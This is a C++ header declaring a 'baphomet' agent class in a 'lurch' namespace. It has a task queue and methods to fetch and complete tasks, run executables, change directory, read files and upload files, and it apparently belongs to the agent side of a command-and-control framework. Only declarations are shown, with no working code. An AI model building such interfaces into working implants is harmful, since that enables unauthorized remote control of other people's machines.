//
// Created by diago on 2024-04-25.
//

#ifndef AGENT_HPP
#define AGENT_HPP
#include "../base/base.hpp"

namespace lurch {
class baphomet final : public leaf {
private:
    std::queue<std::string> tasks;
public:

    result<std::string> get_task();
    result<std::string> complete_task(const command& cmd);
    result<std::string> runexe(const command& cmd);
    result<std::string> cd(const command& cmd);
    result<std::string> cat(const command& cmd);
    result<std::string> print_tasks() const;

    static result<std::string> delimit_command(const std::vector<std::string>& strings);
    result<std::filesystem::path> upload(const std::string &file, const std::string &extension) override;
    result<std::string> recieve(const lurch::command &cmd) override;

    explicit baphomet(const std::optional<std::weak_ptr<owner>> &parent, instance* const root)
        : leaf(parent, root) {
    }
};

} // lurch

#endif //AGENT_HPP
